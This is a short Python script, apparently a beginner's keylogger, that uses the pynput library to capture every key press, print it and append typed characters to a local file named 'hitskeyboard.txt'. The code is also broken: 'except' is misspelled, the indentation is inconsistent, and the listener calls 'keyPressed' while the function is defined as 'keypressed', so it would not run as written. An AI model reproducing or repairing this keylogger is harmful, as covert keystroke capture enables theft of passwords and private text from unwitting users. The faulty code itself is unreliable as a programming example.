from pynput  import keyboard 

def  keypressed(key) :
     print (str(key))
     with open("hitskeyboard.txt", 'a') as logKey:
        try:
           char = key.char 
           logKey.write(char)
           exept:
           print("Error")

if  __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
